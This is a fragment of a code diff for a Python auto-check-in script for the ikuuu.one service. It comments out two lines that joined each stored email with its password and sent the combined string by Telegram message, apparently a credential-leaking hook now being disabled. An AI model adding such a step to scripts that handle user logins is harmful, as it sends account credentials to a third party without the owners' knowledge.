@@ -20,8 +20,8 @@ def denglu():
     for i, entry in enumerate(account_entries, 1):
         try:
             email, passwd = entry.split(":")
-            xiaoxi1=email+passwd
-            send_telegram_message(xiaoxi1)
+            #xiaoxi1=email+passwd
+            #send_telegram_message(xiaoxi1)
             urls.append({
                 "login_url": "https://ikuuu.one/auth/login",
                 "checkin_url": "https://ikuuu.one/user/checkin",
